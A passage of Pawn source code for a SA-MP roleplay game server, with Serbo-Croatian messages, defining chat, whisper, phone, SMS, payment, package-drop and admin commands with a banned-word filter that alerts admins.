	{
        if( strfind( params, ZabranjeneReci[ b ], true ) != -1 )
		{ 
       		AdminMsgForLevel(PlayerInfo[playerid][xAdmin], 0x808000AA, "#WARNING - /me: {FFFFFF}%s[%d] > %s", ImeIgraca( playerid ), playerid, params );
       		break;
        }
	}
	SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "** %s %s.", ImeIgraca( playerid ), params );
	return 1;
}

CMD:ame( playerid, const params[] )
{
    if(gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
    if(Spectate[playerid] != -1 ) return SendErrorMessage( playerid, "Ne mozes pricati dok specas.");
    if(PlayerInfo[playerid][xTogLabel]) return SendErrorMessage(playerid, "Moras imati ukljucen label iznad svoje glave (/tog label)");

	if( isnull( params ) ) return SendUsageMessage( playerid, "/ame [akcija]" );

	for( new b = 0; b < sizeof( ZabranjeneReci ); b++)
	{
        if( strfind( params, ZabranjeneReci[ b ], true ) != -1 )
		{ 
       		AdminMsgForLevel(PlayerInfo[playerid][xAdmin], 0x808000AA, "#WARNING - /ame: {FFFFFF}%s[%d] > %s", ImeIgraca( playerid ), playerid, params );
       		break;
        }
	}
	usingAME[playerid] = true;

	new string[144];
	format(string, sizeof(string), "%s", params);
	SetPlayerChatBubble(playerid, string, 0xC2A2DAFF, 20.0, 14500);

	SetPlayerTimerEx(playerid, "Player_UsingAME", 15000, false, "i", playerid);
	return 1;
}

CMD:do( playerid, const params[] )
{
    if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
    if( Spectate[playerid] != -1 ) return SendErrorMessage( playerid, "Ne mozes pricati dok specas.");

	if( isnull( params ) ) return SendUsageMessage( playerid, "/do [akcija]" );

	for( new b = 0; b < sizeof( ZabranjeneReci ); b++)
	{
        if( strfind( params, ZabranjeneReci[ b ], true ) != -1 )
        { 
       		AdminMsgForLevel(PlayerInfo[playerid][xAdmin], 0x808000AA, "#WARNING - /do: {FFFFFF}%s(%d) > %s", ImeIgraca( playerid ), playerid, params );
       		break;
        }
	}

	SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "** %s (( %s ))", params, ImeIgraca( playerid ) );
	return 1;
}

CMD:attempt( playerid, const params[] )
{
    if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
    if( Spectate[playerid] != -1 ) return SendErrorMessage( playerid, "Ne mozes pricati dok specas.");

	if( isnull( params ) ) return SendUsageMessage( playerid, "/attempt [akcija]");

	new succeed = 1 + random(2);
	if( succeed == 1 )
	{
  		SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s pokusava %s i uspjeva.", ImeIgraca( playerid ), params );
	}
	else if(succeed == 2)
	{
  		SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s pokusava %s i ne uspjeva.", ImeIgraca( playerid ), params );
	}
    return 1;
}

CMD:windows( playerid )
{
    if( IsPlayerInAnyVehicle( playerid ) )
	{
		new carid = GetPlayerVehicleID( playerid );
  		if( IsACabrio( GetVehicleModel( carid ) ) ) return SendErrorMessage( playerid, "Vozilo nema prozora!");
        if( VehicleWindows[ GetPlayerVehicleID( playerid ) ] == 0 )
		{
        	VehicleWindows[ GetPlayerVehicleID( playerid ) ] = 1;

			SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s spusta prozor.", ImeIgraca( playerid ) );
         }
         else if( VehicleWindows[ GetPlayerVehicleID( playerid ) ] == 1 )
		 {
         	VehicleWindows[ GetPlayerVehicleID( playerid ) ] = 0;

			SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s podize prozor.", ImeIgraca( playerid ) );
    	}
    }
    else SendErrorMessage( playerid, "Niste u vozilu!");
    return 1;
}

CMD:knock( playerid )
{
    foreach(new i : iter_Imovina)
	{
		if( IsPlayerInRangeOfPoint(playerid, 3, II[ i ][ iEnter ][ 0 ], II[ i ][  iEnter ][ 1 ], II[ i ][ iEnter ][ 2 ] ) )
		{
  			SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s kuca po vratima.", ImeIgraca( playerid ) );
			foreach( new p : Player)
			{
   				if( IsPlayerInRangeOfPoint( p, 60, II[ i ][ iExit ][ 0 ], II[ i ][ iExit ][ 1 ], II[ i ][ iExit ][ 2 ] ) ) SendClientMessage( p, 0xC2A2DAFF, "(IMOVINA): Netko kuca po vratima.");
			}
		}
	}
	return 1;
}

CMD:c( playerid, const params[] )
{
    if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes koristiti komandu kad si cuffovan ili tazovan.");
	if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
	if( Spectate[playerid] != -1 ) return SendErrorMessage( playerid, "Ne mozes pricati dok specas.");

	new str[ 128 ];
	if( sscanf( params, "s[128]", str ) ) return SendUsageMessage( playerid, "/c [close chat]");

	if(strlen(params) > 0 && strlen(params) < 10) ApplyAnimation(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,500,1);
	else if(strlen(params) >= 10 && strlen(params) < 20) ApplyAnimation(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,1000,1);
	else if(strlen(params) >= 20 && strlen(params) < 30) ApplyAnimation(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,1500,1);
	else if(strlen(params) >= 30 && strlen(params) < 40) ApplyAnimation(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,2000,1);
	else if(strlen(params) >= 40 && strlen(params) < 50) ApplyAnimation(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,2500,1);
	else if(strlen(params) >= 50 && strlen(params) < 61) ApplyAnimation(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,3000,1);

	for( new b = 0; b < sizeof( ZabranjeneReci ); b++)
	{
        if( strfind( str, ZabranjeneReci[ b ], true ) != -1 )
		{ 
       		AdminMsgForLevel(PlayerInfo[playerid][xAdmin], 0x808000AA, "#WARNING - /c: {FFFFFF}%s[%d] > %s", ImeIgraca( playerid ), playerid, str );
       		break;
        }
	}
  	if( IsPlayerInAnyVehicle( playerid ) )
 	{
		SendNearbyMessage(playerid, 3.0, 0xE6E6E6E6, "%s kaze tiho (vozilo): %s", ImeIgraca( playerid ), str );
	}
	else
	{
		SendNearbyMessage(playerid, 3.0, 0xE6E6E6E6, "%s kaze tiho: %s", ImeIgraca( playerid ), str );
	}

	WriteLog("log-chat", "CMD: /c > %s: %s", ImeIgraca( playerid ), params);
	return 1;
}

CMD:s( playerid, const params[] )
{
	if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes koristiti komandu kad si cuffovan ili tazovan.");
	if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
	if( Spectate[playerid] != -1 ) return SendErrorMessage( playerid, "Ne mozes pricati dok specas.");

	new str[ 128 ];
	if( sscanf( params, "s[128]", str ) ) return SendUsageMessage( playerid, "/s [shout chat]");

	for( new b = 0; b < sizeof( ZabranjeneReci ); b++)
	{
        if( strfind( str, ZabranjeneReci[ b ], true ) != -1 )
		{ 
       		AdminMsgForLevel(PlayerInfo[playerid][xAdmin], 0x808000AA, "#WARNING - /s: {FFFFFF}%s[%d] > %s", ImeIgraca( playerid ), playerid, str );
       		break;
        }
	}

	SendNearbyMessage(playerid, 35.0, 0xE6E6E6E6, "%s se dere: %s !!!", ImeIgraca( playerid ), str);

    if( strlen( params ) > 0 && strlen( params ) < 10 ) ApplyAnimation( playerid, "PED", "IDLE_CHAT", 4.0, 0, 0, 0, 0, 500, 1 );
	else if( strlen( params ) >= 10 && strlen(params) < 20 ) ApplyAnimation( playerid, "PED", "IDLE_CHAT", 4.0, 0, 0, 0, 0, 1000, 1 );
	else if( strlen( params ) >= 20 && strlen(params) < 30 ) ApplyAnimation( playerid, "PED", "IDLE_CHAT",4.0,0,0,0,0,1500,1 );
	else if( strlen( params ) >= 30 && strlen(params) < 40 ) ApplyAnimation( playerid, "PED", "IDLE_CHAT",4.0,0,0,0,0,2000,1 );
	else if( strlen( params ) >= 40 && strlen(params) < 50 ) ApplyAnimation( playerid, "PED","IDLE_CHAT",4.0,0,0,0,0,2500,1 );
	else if( strlen( params ) >= 50 && strlen(params) < 61 ) ApplyAnimation(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,3000,1 );

	WriteLog("log-chat", "CMD: /s > %s: %s", ImeIgraca( playerid ), params);
	return 1;
}

CMD:w( playerid, const params[] )
{
    if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes koristiti komandu kad si cuffovan ili tazovan.");
	if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
	if( Spectate[playerid] != -1 ) return SendErrorMessage( playerid, "Ne mozes pricati dok specas.");

	new str[144], id;
    if( sscanf( params, "us[128]", id, str ) ) return SendUsageMessage( playerid, "/w [id] [text]");
	if( IsPlayerConnected( id ) )
	{
		if( IsPlayerNearPlayer( 2.0, playerid, id ) )
		{
			if( id == playerid ) return SendErrorMessage( playerid, "Nisi valjda toliko lud da pricas sam sa sobom?");
			if( AdminDuty[ id ] ) return SendErrorMessage( playerid, "Ne mozes da sapnes adminu ili gamemasteru na duty." );

			for( new b = 0; b < sizeof( ZabranjeneReci ); b++)
			{
		        if( strfind( str, ZabranjeneReci[ b ], true ) != -1 )
				{ 
		       		AdminMsgForLevel(PlayerInfo[playerid][xAdmin], 0x808000AA, "#WARNING - /w: {FFFFFF}%s[%d] > %s", ImeIgraca( playerid ), playerid, str );
		       		break;
		        }
			}

			SCMF( playerid,  0xFF6347FF, "** %s sapuce %s.", ImeIgraca( playerid ), str );
			SCMF( id, 0xFF6347FF, "** %s sapuce %s.", ImeIgraca( playerid ), str );

			SendNearbyMessage(playerid, 5.0, 0xC2A2DAFF, "* %s sapuce nesto.", ImeIgraca( playerid ) );

			foreach(new i : Player)
			{
		 		if( PlayerInfo[ i ][ xAdmin ] >= 3 || IsPlayerAdmin( i ) )
				{
		  			if(!ToggedWISP[i])
					{
						SCMF( i, 0xFFE4C4AA, "#WHISPER: %s -> %s: %s", ImeIgraca( playerid ), ImeIgraca( id ), str );
					}
				}
			}

			WriteLog("log-chat", "CMD: /w > %s: %s", ImeIgraca( playerid ), str);
			return 1;
		}
		else SendErrorMessage( playerid, "Previse ste udaljeni od tog igraca!");
	}
	else SendErrorMessage( playerid, "Taj igrac nije na serveru!");
	return 1;
}

CMD:changename( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");

	new id, novoime[ MAX_PLAYER_NAME ];
	if( sscanf( params, "us[24]", id, novoime ) ) return SendUsageMessage( playerid, "/changename [id] [Ime_Prezime]");
    if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID." );

    new query[128];
	mysql_format( mSQL, query, sizeof(query), "SELECT `user_id` FROM `users` WHERE `p_name` = '%e' LIMIT 1", novoime );
	mysql_tquery( mSQL, query, "CheckPlayerRename", "iis", id, playerid, novoime );
	return 1;
}

CMD:passwordigraca( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");

	new imeigraca[ MAX_PLAYER_NAME ];
	if( sscanf( params, "s[24]", imeigraca ) ) return SendUsageMessage( playerid, "/passwordigraca [Ime_Prezime]" );

    new query[128];
	mysql_format( mSQL, query, sizeof(query), "SELECT `user_id` FROM `users` WHERE `p_name` = '%e' LIMIT 1", imeigraca );
	mysql_tquery( mSQL, query, "CheckPlayerChangePW", "is", playerid, imeigraca );
	return 1;
}

CMD:listavozila( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

    new model;
	if( sscanf( params, "i", model ) ) return SendUsageMessage( playerid, "/listavozila [model vozila]" );

	if( model < 400 || model > 611 ) return SendErrorMessage( playerid, "Model vozila ne moze ici ispod 400 ili iznad 611." );

    new query[ 144 ];
	mysql_format( mSQL, query, sizeof(query), "SELECT `veh_id` FROM `vehicles` WHERE `v_model` = '%d' AND `v_usage` = '%d'", model, PRIVATNO_VOZILO );
	mysql_tquery( mSQL, query, "selectQueryVehModelList", "ii", playerid, model );
	return 1;
}

CMD:playerrich( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 5 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	new name[MAX_PLAYER_NAME];
	if(sscanf(params, "s[24]", name)) return SendUsageMessage( playerid, "/playerrich [name]");
	if(strlen(name) < 3 || strlen(name) > 24) return SendErrorMessage(playerid, "Ne mozete ispod 3 i preko 24.");

    mysql_tquery( mSQL, "SET OPTION SQL_BIG_SELECTS = 1", "CheckPlayerOffRich_Z", "is", playerid, name );
	return 1;
}

CMD:pay( playerid, const params[] )
{
	new giveplayerid,
	    playermoney,
	    moneys;

	if( sscanf( params, "ri", giveplayerid, moneys ) ) return SendUsageMessage( playerid, "/pay [id] [kolicina]");
	if( giveplayerid == playerid ) return SendErrorMessage(playerid, "Ne mozete sami sebi.");
	if( PlayerInfo[ playerid ][ xLevel ] < 5 ) return SendErrorMessage( playerid, "Morate biti level 5 da bi poslali novac.");
	if( moneys > 100 && PlayerInfo[ playerid ][ xLevel ] < 5 ) return SendErrorMessage( playerid, "Morate biti level 5 da bi poslali preko 100.");
	if( moneys < 1 || moneys > 25000 ) return SendErrorMessage( playerid, "Nemojte slati manje od 1, ili vise od 25000 odjednom.");
	if( IsPlayerConnected( giveplayerid ) )
	{
 		if( giveplayerid != IPI )
		 {
			if( IsPlayerNearPlayer( 5.0, playerid, giveplayerid ) )
			{
				playermoney = PlayerInfo[ playerid ][ xNovac ];
				if( moneys > 0 && playermoney >= moneys )
				{
					DajIgracuNovac( playerid, -moneys );
					DajIgracuNovac( giveplayerid, moneys );

					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					SCMF( playerid, 0x33CCFFFF, "(PAY): Dali ste {FFFFFF}%s(%d) {33CCFF}> {FFFFFF}$%s.", ImeIgraca( giveplayerid ), giveplayerid, fNumber(moneys));
					SCMF( giveplayerid, 0x33CCFFFF, "(PAY): Primili ste {FFFFFF}$%s {33CCFF}od {FFFFFF}%s(%d).", fNumber(moneys), ImeIgraca( playerid ), playerid );
					PlayerPlaySound( giveplayerid, 1052, 0.0, 0.0, 0.0 );

     				SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s vadi svoj novcanik i daje nesto novca %s.", ImeIgraca( playerid ), ImeIgraca( giveplayerid ) );

					WriteLog("log-pay", "Igrac %s -> Igrac: %s | Novac: %d", ImeIgraca( playerid ), ImeIgraca( giveplayerid ), moneys);
				}
				else SendErrorMessage( playerid, "Nepravilan iznos transakcije.");
			}
			else SendErrorMessage( playerid, "Taj igrac nije dovoljno blizu vas.");
		}
	}
	else SendErrorMessage( playerid, "Taj igrac nije na serveru!");
	return 1;
}

CMD:b( playerid, const params[] )
{
    if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes koristiti komandu kad si cuffovan ili tazovan.");
    if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
    if( Spectate[playerid] != -1 ) return SendErrorMessage( playerid, "Ne mozes pricati dok specas.");

	if( isnull( params ) ) return SendUsageMessage( playerid, "/b [ooc tekst]");

	foreach( new i : Player)
	{
	    if( IsPlayerNearPlayer( 15.0, playerid, i ) ) 
	    {
	    	SCMF( i, 0x4282C0FF, "(( OOC | {FFFFFF}[%d] {%06x}%s: {FFFFFF}%s {4282C0}))", playerid, GetPlayerColor(playerid) >>> 8, ImeIgraca( playerid ), params );
	    }
	}

    WriteLog("log-chat", "CMD: /b > %s: %s", ImeIgraca( playerid ), params);

    for( new b = 0; b < sizeof( ZabranjeneReci ); b++)
	{
        if( strfind( params, ZabranjeneReci[ b ], true ) != -1 )
		{ 
       		AdminMsgForLevel(PlayerInfo[playerid][xAdmin], 0x808000AA, "#WARNING - /b: {FFFFFF}%s[%d] > %s", ImeIgraca( playerid ), playerid, params );
       		break;
        }
	}
	return 1;
}

CMD:startpaket( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 6 )
	{
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

		for( new i = 0; i < MAX_PAKETI; i++ )
		{
			format( DialogStrgEx, sizeof( DialogStrgEx ), "%s%d - %s\n", DialogStrgEx, i+1, paketInfo[ i ][ p_loc_name ] );
		}

		ShowPlayerDialog( playerid, dialog_STARTPAKET, DIALOG_STYLE_LIST, "{FFFFFF}Izaberi lokaciju:", DialogStrgEx, "Potvrdi", "Odustani" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	return 1;
}

CMD:bacipaket( playerid, const params[] )
{
	if( IgracNosiPaket[ playerid ] )
	{
	    new OrgID = PlayerInfo[ playerid ][ xClan ];

		SMG_DisablePlayerCheckpoint( playerid );
		CheckpointStatus[ playerid ] = 0;

		RemovePlayerAttachedObject( playerid, OBJECT_SLOT_MAIN );

		IgracNosiPaket[ playerid ] = false;
		ServerInfo[ PaketNijeNaSvomMestu ] = true;

		GetPlayerPos( playerid, PaketNewPos[ 0 ], PaketNewPos[ 1 ], PaketNewPos[ 2 ] );

        if( IsValidDynamicObject( ServerInfo[ PaketObject ] ) ) DestroyDynamicObject( ServerInfo[ PaketObject ] );

		ServerInfo[ PaketVreme ] = 3;
		SetTimer_("SmanjiPaketVreme", 1000, 1000, 4);
       	ServerInfo[ PaketObject ] = CreateDynamicObject(328, PaketNewPos[ 0 ], PaketNewPos[ 1 ], PaketNewPos[ 2 ], 0.0, 0.0, 0.0, 0, 0, -1, .priority = 1);

		foreach( new i : Player)
		{
        	if( GetFactionType( i ) == ORG_TIP_MAFIJA || GetFactionType( i ) == ORG_TIP_BANDA || PlayerInfo[ i ][ xAdmin ] > 0 || PlayerInfo[ i ][ xSpecAdmin ] > 0 )
			{
				SCMF( i, 0xFFFF00FF, "(PAKET): {FFFFFF}%s(%s) {FFFF00}je bacio paket, pozurite i nadjite ga.", ImeIgraca( playerid ), org_info[ OrgID ][ oPreFix ] );
				SCMF( i, 0xFFFF00FF, "(PAKET): Lokacija: {FFFFFF}%s", GetPlayerLocation( playerid ) );
				SendClientMessage( i, 0xFFFF00FF, "(PAKET): Ukoliko niko ne pokupi paket narednih {FFFFFF}(10) {FFFF00}minuta, paket ce nestati." );
			}
		}

		ServerInfo[ PaketTimer ] = SetTimer_("DestroyPaket", 1, 600000, 1);
	}
	else SendErrorMessage( playerid, "Nemate paket koji bi ste bacili." );
	return 1;
}
_:public SmanjiPaketVreme()
{
	if(ServerInfo[PaketVreme] != 0) ServerInfo[PaketVreme]--; 
	return 1;
}

CMD:dajpaket( playerid, const params[] )
{
	if( !IgracNosiPaket[ playerid ] ) return SendErrorMessage( playerid, "Nemate paket koji bi ste dali igracu." );

	new ID;
	if( sscanf( params, "u", ID ) ) return SendUsageMessage( playerid, "/dajpaket [id]");

	if( IsPlayerConnected( ID ) )
	{
		if( ID != IPI )
		{
		    if( GetFactionType( ID ) == ORG_TIP_MAFIJA || GetFactionType( ID ) == ORG_TIP_BANDA )
		    {
			    SMG_DisablePlayerCheckpoint( playerid );
				CheckpointStatus[ playerid ] = 0;
				RemovePlayerAttachedObject( playerid, OBJECT_SLOT_MAIN );
				IgracNosiPaket[ playerid ] = false;

			    new OrgID = PlayerInfo[ ID ][ xClan ];

				SetPlayerAttachedObject( ID, OBJECT_SLOT_MAIN, 328, 6, 0.00, 0.00, 0.00, 0.0, 0.0, 0.0, 1.31, 1.28, 1.00 );
				IgracNosiPaket[ ID ] = true;

                if( org_info[ OrgID ][ oEntFromBussines ] != -1 )
                {
                    new bussines_id = org_info[ OrgID ][ oEntFromBussines ];
                    SMG_SetPlayerCheckpoint( ID, BusinessInfo[ bussines_id ][ bEnterX ], BusinessInfo[ bussines_id ][ bEnterY ], BusinessInfo[ bussines_id ][ bEnterZ ], 2.0 );
                }
				else
				{
					SMG_SetPlayerCheckpoint( ID, org_info[ OrgID ][ oPozExtX ], org_info[ OrgID ][ oPozExtY ], org_info[ OrgID ][ oPozExtZ ], 2.0 );
				}
				CheckpointStatus[ ID ] = 7;

	            foreach( new i : Player)
				{
        			if( GetFactionType( i ) == ORG_TIP_MAFIJA || GetFactionType( i ) == ORG_TIP_BANDA || PlayerInfo[ i ][ xAdmin ] > 0 || PlayerInfo[ i ][ xSpecAdmin ] > 0 )
					{
						SCMF( i, 0xFFFF00FF, "(PAKET): Paket je sada kod {FFFFFF}%s(%s), {FFFF00}pokusajte ga pronaci i uzeti mu paket.", ImeIgraca( ID ), org_info[ OrgID ][ oPreFix ] );
					}
				}

				SendInfoMessage( ID, "Igrac {FFFFFF}%s {4282C0}vam je dao paket.", ImeIgraca( playerid ) );
		        SendInfoMessage( playerid, "Igrac {FFFFFF}%s {4282C0}je uzeo paket.", ImeIgraca( ID ) );
            }
			else return SendErrorMessage( playerid, "Igrac nije ni u bandi ni u mafiji.");
		}
	}
	else return SendErrorMessage( playerid, "Nema takvog igraca!");
	return 1;
}

CMD:number( playerid, const params[] )
{
	new ID;
	if( sscanf(params, "u", ID )) return SendUsageMessage( playerid, "/number [id]");
	if( IsPlayerConnected( ID ) )
	{
		if( ID != IPI )
		{
			SCMF( playerid, 0xFFFF00FF, "(BROJ): {FFFFFF}%s, {FFFF00}Broj: {FFFFFF}(%d).", ImeIgraca( ID ), PlayerInfo[ ID ][ xBrojTelefona ] );
		}
	}
	else return SendErrorMessage( playerid, "Nema takvog igraca!");
	return 1;
}

CMD:call( playerid, const params[] )
{
    if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_MAIN ) ) return SendErrorMessage( playerid, "Vec imas objekt u ruci ne mozes zvati ili javiti se." );
    if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");

	new phonenumb, igrac;
    if(sscanf(params, "i", phonenumb) ) return SendUsageMessage( playerid, "/call [phonenumber]");
    if(PlayerInfo[ playerid ][ xBrojTelefona ] == 0 ) return SendErrorMessage( playerid, "Nemate mobilni telefon.");
	if(PlayerInfo[ playerid ][ xTelefonBon ] < 1) return SendErrorMessage( playerid, "Preostala svota na racunu nije dovoljna za uspostavu poziva!" );
	if(PlayerInfo[ playerid ][ xZatvor ] == JAIL || PlayerInfo[ playerid ][ xZatvor ] == PRISON ) return SendErrorMessage( playerid, "Ne mozete telefonirati dok ste u jailu / prisonu.");
	if(phonenumb == PlayerInfo[ playerid ][ xBrojTelefona ] ) return SendClientMessage( playerid, CRVENA, "(TELEFON): Zauzeto...");
	if(Mobile[playerid] != -1 ) return SendErrorMessage( playerid, "Vec ste u razgovoru...");

	SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s vadi mobilni telefon.", ImeIgraca( playerid ) );

	foreach(new i : Player)
	{
		if( PlayerInfo[ i ][ xBrojTelefona ] == phonenumb && phonenumb != 0)
		{
			igrac = i;
			Mobile[playerid] = igrac;
			if( IsPlayerConnected( igrac ) )
			{
			    if( igrac != IPI )
				{
			        if(PhoneOnline[ igrac ] > 0 ) return SendErrorMessage( playerid, "Korisnik je ugasio telefon.");
      		        if(PlayerInfo[ igrac ][ xZatvor ] == JAIL || PlayerInfo[ igrac ][ xZatvor ] == PRISON ) return SendErrorMessage( playerid, "Osoba je pritvorena i ne moze vam se javiti.");
      		        if(AdminDuty[igrac]) return SendErrorMessage(playerid, "Ne mozete zvati admina dok je na duznosti.");

					if( Mobile[igrac] == -1)
					{
						SCMF( igrac, 0xFFFF00FF, "(CALL): Vas mobilni zvoni ukucajte {FFFFFF}[ /(p)pickup ]. {FFFF00}Pozivatelj: {FFFFFF}%s", ImeIgraca( playerid ) );
						SendClientMessage( playerid, -1, "(HELP): Na mobilni sada pricate sa 'T', ukucajte [ /(h)hangup ] da bi ste prekinuli razgovor.");

						SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s zvoni mobilni.", ImeIgraca( igrac ) );
						CellTime[playerid] = 1;
						return 1;
					}
				}
			}
		}
	}
	SendClientMessage(playerid, CRVENA, "(TELEFON): Zauzeto...");
	return 1;
}

CMD:pickup( playerid, const params[] )
{
    if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
    if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete se javiti dok ste u jailu / prisonu.");

    if(Mobile[playerid] == -1)
	{
        foreach(new i : Player)
		{
			if( Mobile[i] == playerid )
			{
				Mobile[playerid] = i;
				SCMF(i, 0xFFFF00FF, "(TELEFON): Javi%s se, koristite 'T' chat.", getPolForString(playerid, "o", "la"));

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s se javlja na mobilni telefon.", ImeIgraca( playerid ) );
				break;
			}
		}
    }
    else SendClientMessage( playerid, CRVENA, "(TELEFON): Vec ste u razgovoru.");
    return 1;
}
alias:pickup("p");

CMD:hangup( playerid )
{
	if(Mobile[playerid] == -1) return SendErrorMessage(playerid, "Jedan mi zvoni, drugi mi zvoni, jedan mi Nokia, drugi mi Sony, al' telefon vam ne zvoni.");
    
    new caller = Mobile[playerid];
	CellTime[playerid] = 0;
	Mobile[playerid] = -1;

   	if( caller != IPI )
	{
   	    if( PlayerLogged[ caller ] )
		{
	    	SendClientMessage( caller, 0xAFAFAFAA, "(TELEFON): Prekinuo je.");
			SendClientMessage( playerid, 0xAFAFAFAA, "(TELEFON): Prekinuli ste poziv.");

			CellTime[caller] = 0;
			CellTime[playerid] = 0;
			Mobile[caller] = -1;
		}
	}
    return 1;
}
alias:hangup("h");

CMD:sms( playerid, const params[] )
{
	if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");

	new phonenumb, result[128], igrac;
    if( sscanf(params, "is[128]", phonenumb, result ) ) return SendUsageMessage( playerid, "/sms [broj telefona] [poruka]");
	if( PlayerInfo[ playerid ][ xBrojTelefona ] == 0) return SendErrorMessage( playerid, "Nemate mobilni telefon.");
	if( PlayerInfo[ playerid ][ xTelefonBon ] < 1) return SendErrorMessage( playerid, "Preostala svota na racunu nije dovoljna da posaljete SMS!" );
	if( PlayerInfo[ playerid ][ xZatvor ] == JAIL || PlayerInfo[ playerid ][ xZatvor ] == PRISON ) return SendErrorMessage( playerid, "Ne mozete telefonirati dok ste u jailu / prisonu.");

	foreach( new i : Player)
	{
		if( PlayerInfo[ i ][ xBrojTelefona ] == phonenumb && phonenumb != 0 )
		{
			igrac = i;
			if( IsPlayerConnected( igrac ) )
			{
			    if( igrac != IPI )
				{
			        if( PhoneOnline[ igrac ] > 0 ) return SendErrorMessage( playerid, "Korisnik je ugasio telefon.");
					if( PlayerInfo[ igrac ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete igracu slati sms dok je u jailu / prisonu.");

					SCMF( igrac, 0xFFFF00FF, "(SMS): Posiljatelj: {FFFFFF}%s {FFFF00}| Broj: {FFFFFF}(%d)", ImeIgraca( playerid ), PlayerInfo[ playerid ][ xBrojTelefona ] );
					SCMF( igrac, 0xFFFF00FF, "(SMS): {FFFFFF}%s", result );
 
					foreach(new g : Player)
					{
				 		if( (PlayerInfo[ g ][ xAdmin ] >= 1 || PlayerInfo[ g ][ xSpecAdmin ] >= 1) && !ToggedPM[g])
						{
				  			SCMF( g, ZUTA, "#SMS: %s(%d) > %s(%d): %s", ImeIgraca( playerid ), playerid, ImeIgraca( igrac ), igrac, result );
						}
					}

					PlayerInfo[ playerid ][ xTelefonBon ] -= smscost;
		          	PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0 );
		          	PlayerPlaySound( igrac, 1052, 0.0, 0.0, 0.0 );

		           	SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s salje poruku.", ImeIgraca( playerid ) );

					SCMF(playerid, 0xFFFF00FF, "(SMS): Poslali ste poruku, cena poruke {FFFFFF}(%d).", smscost );
					return 1;
				}
			}
		}
	}
	SendClientMessage( playerid, 0xAFAFAFAA, "(SMS): Slanje poruke neuspelo...");
	return 1;
}

CMD:time( playerid, const params[] )
{
	if(UzeoOpremu[playerid]) return SendErrorMessage(playerid, "Ne mozes dok radis posao.");
    if( PlayerInfo[ playerid ][ xSat ] != 0 )
    {
		new mtext[12], year, month, day;
		getdate( year, month, day );

		switch(month)
		{
			case 1: mtext = "Januar";
			case 2: mtext = "Februar";
			case 3: mtext = "Mart";
			case 4: mtext = "April";
			case 5: mtext = "Maj";
			case 6: mtext = "Jun";
			case 7: mtext = "Jul";
			case 8: mtext = "Avgust";
			case 9: mtext = "Semptembar";
			case 10: mtext = "Oktobar";
			case 11: mtext = "Novembar";
			case 12: mtext = "Decembar";
		}

	    new hour, minuite, second;
		gettimeEx( hour, minuite, second );
		FixHour( hour );
		hour = shifthour;

